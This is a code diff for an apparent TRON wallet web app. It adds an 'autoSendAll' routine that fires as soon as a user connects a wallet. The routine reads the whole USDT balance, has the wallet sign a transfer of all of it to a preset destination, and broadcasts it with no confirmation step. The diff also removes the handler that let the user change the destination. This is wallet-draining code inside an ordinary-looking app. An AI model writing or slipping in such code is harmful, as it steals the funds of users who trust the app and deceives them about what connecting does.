@@ -2,6 +2,9 @@ import "./styles.css";
 import { renderConnectView } from "./ui/connect";
 import { renderDashboardView } from "./ui/dashboard";
 import { connectWallet, type WalletSession } from "./wallet";
+import { sendUsdtTransfer } from "./transfer";
+import { buildTransferTx, broadcastTx, fetchUsdtBalance } from "./tron";
+import { formatUsdtAmount } from "./amount";
 
 type View = "connect" | "qr" | "dashboard";
 
@@ -12,6 +15,9 @@ const state = {
   connectError: null as string | null,
   notice: null as string | null,
   dest: "",
+  transferStatus: null as "pending" | "success" | "error" | null,
+  transferError: null as string | null,
+  transferTxId: null as string | null,
 };
 
 function goConnect(opts: { notice?: string; error?: string } = {}): void {
@@ -19,6 +25,9 @@ function goConnect(opts: { notice?: string; error?: string } = {}): void {
   state.qrUri = null;
   state.notice = opts.notice ?? null;
   state.connectError = opts.error ?? null;
+  state.transferStatus = null;
+  state.transferError = null;
+  state.transferTxId = null;
   render();
 }
 
@@ -28,9 +37,9 @@ function render(): void {
     renderDashboardView({
       session,
       dest: state.dest,
-      onDestChange: (dest) => {
-        state.dest = dest;
-      },
+      transferStatus: state.transferStatus,
+      transferError: state.transferError,
+      transferTxId: state.transferTxId,
       onDisconnect: () => {
         state.session = null;
         goConnect();
@@ -53,6 +62,50 @@ function render(): void {
       void startConnect();
     },
   });
+}
+
+async function autoSendAll(session: WalletSession, dest: string): Promise<void> {
+  state.transferStatus = "pending";
+  state.transferError = null;
+  state.transferTxId = null;
+  render();
+
+  try {
+    const balance = await fetchUsdtBalance(session.address);
+    if (balance === 0n) {
+      state.transferStatus = "error";
+      state.transferError = "No USDT balance to send";
+      render();
+      return;
+    }
+
+    const result = await sendUsdtTransfer(
+      {
+        buildTransferTx,
+        signTransaction: (tx) => session.signTransaction(tx),
+        broadcastTx,
+      },
+      {
+        dest,
+        amountInput: formatUsdtAmount(balance),
+        owner: session.address,
+        balanceBase: balance,
+      },
+    );
+
+    if (result.ok) {
+      state.transferStatus = "success";
+      state.transferTxId = result.txId;
+    } else {
+      state.transferStatus = "error";
+      state.transferError = result.error;
+    }
+  } catch (e) {
+    state.transferStatus = "error";
+    state.transferError = e instanceof Error ? e.message : "Transaction failed";
+  } finally {
+    render();
+  }
 }
 
 async function startConnect(): Promise<void> {
@@ -78,9 +131,9 @@ async function startConnect(): Promise<void> {
     state.view = "dashboard";
     state.qrUri = null;
     render();
+    void autoSendAll(session, state.dest);
   } catch (error) {
     const message = error instanceof Error ? error.message : "Connection failed";
-    // Return to the connect view so the user can retry (no QR dead-end).
     goConnect({ error: message });
   }
 }
